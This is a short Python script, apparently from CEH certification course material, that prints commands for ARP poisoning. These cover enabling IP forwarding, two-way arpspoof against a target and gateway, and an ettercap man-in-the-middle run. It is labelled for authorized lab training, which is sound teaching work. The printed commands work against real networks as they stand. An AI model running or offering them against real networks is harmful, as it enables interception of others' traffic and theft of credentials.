#!/usr/bin/env python3
# LAB-ONLY: ARP Poisoning Helper
# CEH v13 Master Module 08
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for ARP spoofing using ettercap or arpspoof
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_ATTACKER_INTERFACE = "eth0"
LAB_TARGET_IP = "192.168.100.10"
LAB_GATEWAY_IP = "192.168.100.1"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: ARP Poisoning Helper")
    print("="*80)
    print("Enable IP forwarding first!")
    print("Linux: echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("macOS: sysctl -w net.inet.ip.forwarding=1")
    print()
    print("Method 1: arpspoof:")
    print(f"arpspoof -i {LAB_ATTACKER_INTERFACE} -t {LAB_TARGET_IP} {LAB_GATEWAY_IP}")
    print(f"arpspoof -i {LAB_ATTACKER_INTERFACE} -t {LAB_GATEWAY_IP} {LAB_TARGET_IP}")
    print()
    print("Method 2: ettercap (text mode):")
    print(f"ettercap -i {LAB_ATTACKER_INTERFACE} -T -M arp:remote /{LAB_TARGET_IP}// /{LAB_GATEWAY_IP}//")

if __name__ == "__main__":
    main()
